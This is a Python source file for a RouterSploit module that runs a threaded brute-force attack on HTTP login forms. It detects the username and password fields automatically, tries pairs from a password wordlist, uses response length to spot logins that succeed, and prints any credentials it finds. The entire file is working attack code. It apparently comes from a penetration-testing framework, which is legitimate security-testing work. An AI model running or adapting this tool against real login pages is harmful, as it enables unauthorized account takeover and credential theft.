import threading
import requests
import itertools
from bs4 import BeautifulSoup

from routersploit import (
    exploits,
    wordlists,
    print_status,
    print_error,
    LockedIterator,
    print_success,
    print_table,
    sanitize_url,
    boolify,
    multi,
)


class Exploit(exploits.Exploit):
    """
    Module performs bruteforce attack against HTTP form service.
    If valid credentials are found, they are displayed to the user.
    """
    __info__ = {
        'name': 'HTTP Form Bruteforce',
        'description': 'Module performs bruteforce attack against HTTP form service. '
                       'If valid credentials are found, they are displayed to the user.',
        'authors': [
            'Marcin Bury <marcin.bury[at]reverse-shell.com>',  # routersploit module
        ],
        'references': [
            '',
        ],
        'devices': [
            'Multi',
        ],
    }

    target = exploits.Option('', 'Target IP address or file with target:port (file://)')
    port = exploits.Option(80, 'Target port')
    threads = exploits.Option(8, 'Number of threads')
    usernames = exploits.Option('admin', 'Username or file with usernames (file://)')
    passwords = exploits.Option(wordlists.passwords, 'Password or file with passwords (file://)')
    form = exploits.Option('auto', 'Post Data: auto or in form login={{USER}}&password={{PASS}}&submit')
    path = exploits.Option('/login.php', 'URL Path')
    form_path = exploits.Option('same', 'same as path or URL Form Path')
    verbosity = exploits.Option('yes', 'Display authentication attempts')
    stop_on_success = exploits.Option('yes', 'Stop on first valid authentication attempt')

    credentials = []
    data = ""
    invalid = {"min": 0, "max": 0}

    def run(self):
        self.credentials = []
        self.attack()

    def get_form_path(self):
        if self.form_path == 'same':
            return self.path
        else:
            return self.form_path

    @multi
    def attack(self):
        url = sanitize_url("{}:{}{}".format(self.target, self.port, self.get_form_path()))

        try:
            requests.get(url, verify=False)
        except (requests.exceptions.MissingSchema, requests.exceptions.InvalidSchema):
            print_error("Invalid URL format: %s" % url)
            return
        except requests.exceptions.ConnectionError:
            print_error("Connection error: %s" % url)
            return

        # authentication type
        if self.form == 'auto':
            form_data = self.detect_form()

            if form_data is None:
                print_error("Could not detect form")
                return

            (form_action, self.data) = form_data
            if form_action:
                self.path = form_action
        else:
            self.data = self.form

        print_status("Using following data: ", self.data)

        # invalid authentication
        self.invalid_auth()

        # running threads
        if self.usernames.startswith('file://'):
            usernames = open(self.usernames[7:], 'r')
        else:
            usernames = [self.usernames]

        if self.passwords.startswith('file://'):
            passwords = open(self.passwords[7:], 'r')
        else:
            passwords = [self.passwords]

        collection = LockedIterator(itertools.product(usernames, passwords))
        self.run_threads(self.threads, self.target_function, collection)

        if len(self.credentials):
            print_success("Credentials found!")
            headers = ("Target", "Port", "Login", "Password")
            print_table(headers, *self.credentials)
        else:
            print_error("Credentials not found")

    def invalid_auth(self):
        for i in range(0, 21, 5):
            url = sanitize_url("{}:{}{}".format(self.target, self.port, self.path))
            headers = {u'Content-Type': u'application/x-www-form-urlencoded'}

            user = "A" * i
            password = "A" * i

            postdata = self.data.replace("{{USER}}", user).replace("{{PASS}}", password)
            r = requests.post(url, headers=headers, data=postdata, verify=False)
            length = len(r.text)

            if i == 0:
                self.invalid = {"min": length, "max": length}

            if length < self.invalid["min"]:
                self.invalid["min"] = length
            elif length > self.invalid["max"]:
                self.invalid["max"] = length

    def detect_form(self):
        url = sanitize_url("{}:{}{}".format(self.target, self.port, self.get_form_path()))
        r = requests.get(url, verify=False)
        soup = BeautifulSoup(r.text, "lxml")

        forms = soup.findAll("form")

        if forms is None:
            return None

        res = []
        action = None
        user_name_list = ["username", "user", "user_name", "login", "username_login", "nameinput", "uname", "__auth_user", "txt_user", "txtusername"]
        password_list = ["password", "pass", "password_login", "pwd", "passwd", "__auth_pass", "txt_pwd", "txtpwd"]
        found = False

        for form in forms:
            tmp = []

            if not len(form):
                continue

            action = form.attrs.get('action', None)
            if action and not action.startswith("/"):
                action = "/" + action

            for inp in form.findAll("input"):
                attributes = ["name", "id"]

                for atr in attributes:
                    if atr not in inp.attrs.keys():
                        continue

                    if inp.attrs[atr].lower() in user_name_list and inp.attrs['type'] != "hidden":
                        found = True
                        tmp.append(inp.attrs[atr] + "=" + "{{USER}}")
                    elif inp.attrs[atr].lower() in password_list and inp.attrs['type'] != "hidden":
                        found = True
                        tmp.append(inp.attrs[atr] + "=" + "{{PASS}}")
                    else:
                        if 'value' in inp.attrs.keys():
                            tmp.append(inp.attrs[atr] + "=" + inp.attrs['value'])
                        elif inp.attrs['type'] not in ("submit", "button"):
                            tmp.append(inp.attrs[atr] + "=")

                if found:
                    res = tmp

        res = list(set(res))
        return (action, '&'.join(res))

    def target_function(self, running, data):
        module_verbosity = boolify(self.verbosity)
        name = threading.current_thread().name
        url = sanitize_url("{}:{}{}".format(self.target, self.port, self.path))
        headers = {u'Content-Type': u'application/x-www-form-urlencoded'}

        print_status(name, 'process is starting...', verbose=module_verbosity)

        while running.is_set():
            try:
                user, password = data.next()
                user = user.strip()
                password = password.strip()

                postdata = self.data.replace("{{USER}}", user).replace("{{PASS}}", password)
                r = requests.post(url, headers=headers, data=postdata, verify=False)
                length = len(r.text)

                if length < self.invalid["min"] or length > self.invalid["max"]:
                    if boolify(self.stop_on_success):
                        running.clear()

                    print_success("Target: {}:{} {}: Authentication Succeed - Username: '{}' Password: '{}'".format(self.target, self.port, name, user, password), verbose=module_verbosity)
                    self.credentials.append((self.target, self.port, user, password))
                else:
                    print_error(name, "Target: {}:{} {}: Authentication Failed - Username: '{}' Password: '{}'".format(self.target, self.port, name, user, password), verbose=module_verbosity)
            except StopIteration:
                break

        print_status(name, 'process is terminated.', verbose=module_verbosity)
